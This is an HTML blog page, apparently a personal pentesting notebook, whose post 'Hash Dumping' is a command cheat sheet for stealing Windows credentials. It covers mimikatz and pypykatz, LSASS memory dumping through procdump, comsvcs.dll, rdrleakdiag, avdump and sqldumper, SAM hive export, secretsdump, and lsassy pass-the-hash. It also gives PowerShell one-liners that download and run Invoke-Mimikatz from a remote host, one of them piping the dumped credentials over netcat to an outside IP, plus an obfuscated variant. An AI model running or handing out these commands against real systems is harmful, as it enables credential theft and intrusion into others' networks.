@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Whatever is worth doing is worth doing well !">
+    <meta name="author" content="ssooking">
+    
+    <title>
+        
+            Hash Dumping |
+        
+        ssooking&#39;s notebook
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                ssooking&#39;s notebook
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Hash Dumping</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">ssooking</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-01-25 13:19:00</span>
+        <span class="mobile">2020-01-25 13:19</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/HashDumping/">HashDumping</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Mimikatz/">Mimikatz</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="Hash-Dumping"><a href="#Hash-Dumping" class="headerlink" title="Hash Dumping"></a>Hash Dumping</h1><h2 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="built_in">log</span> <span class="string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="built_in">exit</span></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">mimikatz.exe privilege::debug sekurlsa::logonpasswords <span class="built_in">exit</span> &gt; C:\programdata\log.txt</span><br><span class="line"></span><br><span class="line">SSPLoader.exe C:\Users\XuanJian\Desktop\ssp\lsassDump.dll    注意需要用绝对路径！</span><br><span class="line">C:\Users\Public\Videos\dump.bin</span><br><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump dump.bin&quot;</span> <span class="built_in">log</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用方法如下：</span><br><span class="line">privilege::debug</span><br><span class="line">inject::process lsass.exe F:\tools\x64\sekurlsa.dll</span><br><span class="line">@getLogonPasswords</span><br><span class="line"></span><br><span class="line">//提升权限</span><br><span class="line">privilege::debug</span><br><span class="line">dllinject::process lsass.exe sekurlsa.dll</span><br><span class="line">@getLogonPasswords</span><br><span class="line"></span><br><span class="line">mimikatz.exe <span class="string">&quot;privilege::debug&quot;</span> <span class="built_in">log</span> <span class="string">&quot;sekurlsa::logonpasswords full&quot;</span> <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::minidump C:\Users\John\Desktop\minidump_656.dmp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#从SAM转储凭</span></span><br><span class="line">mimikatz <span class="comment"># token::elevate</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::sam</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注入mimikatz的ssp（mimilib.dll）窃取凭据</span></span><br><span class="line">privilege::debug</span><br><span class="line">misc:memssp</span><br></pre></td></tr></table></figure>
+
+
+
+<p> <a href="">Invoke-Mimikatz</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -DumpCreds&quot;</span> | nc -vv 192.168.3.28 1234</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="procdump"><a href="#procdump" class="headerlink" title="procdump"></a>procdump</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">pypykatz lsa minidump lsass.dmp</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="comsvcs-dll"><a href="#comsvcs-dll" class="headerlink" title="comsvcs.dll"></a>comsvcs.dll</h2><p>一个名为<strong>comsvcs.dll</strong>的DLL ，它在<code>C:\Windows\System32</code>每次崩溃时都会转储进程内存。该DLL包含一个称为的<code>MiniDumpW</code>函数，可以通过<code>rundll32.exe</code>调用，但只能SYSTEM权限执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /fi &quot;imagename eq lsass.exe&quot;</span><br><span class="line">rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump &lt;lsass pid&gt; lsass.dmp full</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="executes-mimikatz-xml"><a href="#executes-mimikatz-xml" class="headerlink" title="executes mimikatz.xml"></a>executes mimikatz.xml</h2><p><a class="link"   target="_blank" rel="noopener" href="https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml" >https://raw.githubusercontent.com/3gstudent/msbuild-inline-task/master/executes%20mimikatz.xml<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe C:\1.xml</span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">mimikatz <span class="comment"># sekurlsa::logonpasswords</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="From-SAM"><a href="#From-SAM" class="headerlink" title="From SAM"></a>From SAM</h2><p>注册表导出Hash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.hive</span><br><span class="line">reg save HKLM\SAM sam.hive</span><br><span class="line">reg save hklm\security security.hive</span><br><span class="line">mimikatz.exe <span class="string">&quot;lsadump::sam /system:system.hive /sam:sam.hive&quot;</span> <span class="built_in">exit</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C:\temp&gt; reg save HKLM\SYSTEM system.hive</span><br><span class="line">C:\temp&gt; reg save HKLM\SAM sam.hive </span><br><span class="line">mimikatz <span class="comment"># lsadump::sam /SYSTEM:system.hive /SAM:sam.hive</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#使用kali中的samdump2来读取system和sam：</span></span><br><span class="line">samdump2 system sam</span><br><span class="line"></span><br><span class="line"><span class="comment">#mimikatz 也可以导入sam和system</span></span><br><span class="line">mimikatz <span class="comment"># xx</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="avdump"><a href="#avdump" class="headerlink" title="avdump"></a>avdump</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | findstr lsass.exe</span><br><span class="line">C:\Program Files\Avast Software\Avast\avdump64.exe --pid 532 --exception_ptr 0 --thread_id 0 --dump_level 1 --dump_file C:\ProgramData\lsass.dmp</span><br><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>metasploit</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use windows/gather/avast_memory_dump</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="rdrleakdiag"><a href="#rdrleakdiag" class="headerlink" title="rdrleakdiag"></a>rdrleakdiag</h2><p><a class="link"   target="_blank" rel="noopener" href="https://twitter.com/0gtweet/status/1299071304805560321" >鸣叫<i class="fas fa-external-link-alt"></i></a>由<a class="link"   target="_blank" rel="noopener" href="https://twitter.com/0gtweet" >格热戈日Tworek（@ 0gtweet）<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">File Path: C:\Windows\system32\rdrleakdiag.exe</span><br><span class="line">Description: Microsoft Windows Resource Leak Diagnostic</span><br><span class="line"></span><br><span class="line">rdrleakdiag.exe /p &lt;pid&gt; /o &lt;outputdir&gt; /fullmemdmp /wait 1</span><br></pre></td></tr></table></figure>
+
+<p>此命令利用系统二进制rdrleakdiag.exe，该文件将转储其输入中提供了PID（进程ID）的进程的内存。成功执行该命令将导致创建两个文件，分别为minidump_656.dmp和results_656.hlk。[我们将使用扩展名为.dmp的文件]</p>
+<h2 id="DiskShadow"><a href="#DiskShadow" class="headerlink" title="DiskShadow"></a>DiskShadow</h2><p>卷影复制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wmic shadowcopy call create volume=<span class="string">&#x27;C:\&#x27;</span></span><br><span class="line">vssadmin list shadows</span><br><span class="line">copy xxx\Windows\system32\config\sam .</span><br><span class="line">copy xxx\Windows\system32\config\security .</span><br><span class="line">copy xxx\Windows\system32\config\system .</span><br><span class="line">impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL</span><br><span class="line">然后用得到的Hash去解密</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="pypykatz"><a href="#pypykatz" class="headerlink" title="pypykatz"></a>pypykatz</h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/skelsec/pypykatz" >Pypykatz<i class="fas fa-external-link-alt"></i></a>通过项目<a class="link"   target="_blank" rel="noopener" href="https://twitter.com/skelsec" >Skelsec<i class="fas fa-external-link-alt"></i></a>可以帮助我们解决这个问题。Skelsec用纯python开发了Mimikatz的部分实现，这意味着跨平台。像Mimikatz一样，此工具使我们可以提取lsass转储，并且此工具可以不用将转储文件下载到本地解密，而是直接在目标机器上提取。</p>
+<p>远程分析转储文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp</span><br><span class="line">pypykatz lsa minidump adsec.local/jsnow:Winter_is_coming_\!@DC01.adsec.local:/C$/Windows/Temp/lsass.dmp</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a>secretsdump</h2><p>impacket 中提供了<code>secrestdump</code>的脚本，该脚本可允许转储存储在注册表中的sam、SECURITY、SYSTEM中的所有凭据。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive </span><br><span class="line">reg save hklm\security security.hive</span><br><span class="line"></span><br><span class="line">secretsdump -sam sam.hive -security security.hive -system system.hive <span class="built_in">local</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#kali</span></span><br><span class="line">impacket-secretsdump -sam sam.hive -security security.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="sqldumper"><a href="#sqldumper" class="headerlink" title="sqldumper"></a>sqldumper</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | findstr lsass.exe  查看lsass.exe 的PID号</span><br><span class="line">C:\Program Files\Microsoft SQL Server\number\Shared\sqldumper.exe ProcessID 0 0x01100  导出mdmp文件</span><br><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>rocdump</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">mimikatz.exe <span class="string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Windows-Credential-Editor-WCE"><a href="#Windows-Credential-Editor-WCE" class="headerlink" title="Windows Credential Editor (WCE)"></a>Windows Credential Editor (WCE)</h2><p><a class="link"   target="_blank" rel="noopener" href="https://attack.mitre.org/software/S0005" >https://attack.mitre.org/software/S0005<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="lsassy"><a href="#lsassy" class="headerlink" title="lsassy"></a>lsassy</h2><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/Hackndo/lsassy/wiki/Lsassy-Advanced-Usage" >https://github.com/Hackndo/lsassy/wiki/Lsassy-Advanced-Usage<i class="fas fa-external-link-alt"></i></a></p>
+<p>远程dump</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsassy -d de1ay.com -u administrator -H 161cff084477fe596a5db81874498a24 192.168.100.19 -o C:\Users\Administrator\Desktop\test.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<p>对于涉及凭证转储的特定操作，我们还可以在项目授权下使用secretsdump.py脚本。</p>
+<p>除了以下类型的哈希外，还存在另一种哈希，即MsCacheV2（也称为域缓存凭据），它在Windows中引入，即使客户端计算机与域断开连接，也可以保持用户与域的连接，用户可以执行身份验证。在以NT AUTHORITY \ SYSTEM特权运行缓存的凭据密钥后，在注册表编辑器（regedit.msc）下运行后，我们可以在注册表位置（HKLM \ SECURITY \ Cache）下看到。</p>
+<p>通过使用命令lsadump :: cache，我们可以轻松地转储这些哈希值。 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz <span class="comment"># lsadump::cache</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>mscash</code>，或者叫 domain cached credentials、域缓存票据，与用户在成功登录后将缓存的域凭据存储在系统本地，缓存的凭据不会过期，以防止DC无法通信，任然能够登录机器，另外mscash hash 无法用于PTH。</p>
+<blockquote>
+<p>具体存储在系统哪里，保存在注册表中，结构未域凭据+域授权信息，后面就直接用 “凭据” 来代表 “凭据信息” + “授权信息”。</p>
+</blockquote>
+<h2 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(<span class="string">&#x27;http://x.x.x.x/ps/Invoke-Mimikatz.ps1&#x27;</span>); Invoke-Mimikatz</span><br><span class="line"></span><br><span class="line">powershell <span class="string">&quot;<span class="variable">$a</span>=&#x27;IEX((New-Object Net.WebClient).DownloadString(&#x27;&#x27;ht&#x27;;<span class="variable">$b</span>=&#x27;tp://x.x.x.x/ps/Invoke-Mimikatz.ps1&#x27;&#x27;)); Invoke-Mimikatz&#x27;;IEX (<span class="variable">$a</span>+<span class="variable">$b</span>)&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="lsass-dmp"><a href="#lsass-dmp" class="headerlink" title="lsass.dmp"></a>lsass.dmp</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pypykatz lsa minidump lsass.dmp</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Live kernel dump with PowerShell one-liner</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://twitter.com/0gtweet/status/1273264867382788096" >https://twitter.com/0gtweet/status/1273264867382788096<i class="fas fa-external-link-alt"></i></a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ss = Get-CimInstance -ClassName MSFT_StorageSubSystem -Namespace Root\Microsoft\Windows\Storage</span><br><span class="line">Invoke-CimMethod -InputObject $ss -MethodName &quot;GetDiagnosticInfo&quot; -Arguments @&#123;DestinationPath=&quot;C:\dmp&quot;; IncludeLiveDump=$true&#125;</span><br></pre></td></tr></table></figure>
+
+<p><a class="link"   target="_blank" rel="noopener" href="https://gallery.technet.microsoft.com/scriptcenter/Get-MemoryDump-c5ab38d8" >https://gallery.technet.microsoft.com/scriptcenter/Get-MemoryDump-c5ab38d8<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.volatilityfoundation.org/releases" >https://www.volatilityfoundation.org/releases<i class="fas fa-external-link-alt"></i></a></p>
+<p>绕卡巴</p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.freebuf.com/column/231880.html" >https://www.freebuf.com/column/231880.html<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul>
+<li><a class="link"   target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1003/001/" >https://attack.mitre.org/techniques/T1003/001/<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1626592610700813942&amp;wfr=spider&amp;for=pc" >https://baijiahao.baidu.com/s?id=1626592610700813942&amp;wfr=spider&amp;for=pc<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAxNDM3NTM0NQ==&mid=2657040409&idx=1&sn=97efae485378cbed21a3ddbb6d1fa740&chksm=803fd8c7b74851d110a417fa535e3c76c7da8626834d7cee6d44b24b431568eaaeae98745c8a&mpshare=1&scene=1&srcid=0118uNMcBBisUg5RdgKkMN5A&sharer_sharetime=1610979838645&sharer_shareid=976d206c9e9dde0419bf9e41bec32824#rd" >抓取HASH的10001种方法<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://iv4n.cc/lsass-dump/" >https://iv4n.cc/lsass-dump/<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://en.hackndo.com/remote-lsass-dump-passwords/" >https://en.hackndo.com/remote-lsass-dump-passwords/<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://www.pureid.io/dumping-abusing-windows-credentials-part-1/" >https://www.pureid.io/dumping-abusing-windows-credentials-part-1/<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1656546" >https://cloud.tencent.com/developer/article/1656546<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI5Nzc0OTkxOQ==&mid=2247483811&idx=1&sn=787dc8ba5130d810ff314da12a1eed29&scene=21#wechat_redirect" >你并不懂 Mimikatz Part 1 - Wdigest SSP<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzI5Nzc0OTkxOQ==&mid=2247483824&idx=1&sn=9d2de2de11eb56ac9c75936f6d656788&scene=21#wechat_redirect" >你并不懂 Mimikatz Part 2 - MSCACHE<i class="fas fa-external-link-alt"></i></a></li>
+<li><a class="link"   target="_blank" rel="noopener" href="https://0x1.gitlab.io/reconnaissance-tools/lsassy/" >https://0x1.gitlab.io/reconnaissance-tools/lsassy/<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：Hash Dumping</li>
+        <li>Post author：ssooking</li>
+        <li>Create time：2020-01-25 13:19:00</li>
+        <li>
+            Post link：https://ssooking.github.io/2020/01/hash-dumping/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/HashDumping/">#HashDumping</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item">
+                        <a href="/tags/Mimikatz/">#Mimikatz</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/01/wifi-cracking/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">WiFi Cracking</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/01/pentestbox%E9%85%8D%E7%BD%AE/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">PentestBox配置</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
